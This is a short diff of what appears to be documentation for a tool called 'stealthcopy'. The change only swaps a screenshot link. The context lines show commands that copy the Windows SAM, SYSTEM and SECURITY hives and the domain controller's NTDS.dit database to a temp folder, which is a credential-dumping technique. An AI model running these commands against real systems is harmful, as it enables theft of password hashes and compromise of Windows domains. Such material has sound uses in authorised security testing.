@@ -84,7 +84,8 @@ stealthcopy C:\Windows\System32\config\SAM C:\Temp\out.sam
 stealthcopy C:\Windows\System32\config\SYSTEM C:\Temp\out.system
 stealthcopy C:\Windows\System32\config\SECURITY C:\Temp\out.security
 
-<img width="696" height="494" alt="image" src="https://github.com/user-attachments/assets/8763151f-1146-4d8a-ab99-89211c7a47f3" />
+<img width="699" height="496" alt="image" src="https://github.com/user-attachments/assets/d9c6d0be-0b9a-4415-8632-38f3d390f874" />
+
 
 # Dump Active Directory database (on a DC)
 stealthcopy C:\Windows\NTDS\NTDS.dit C:\Temp\out.dit
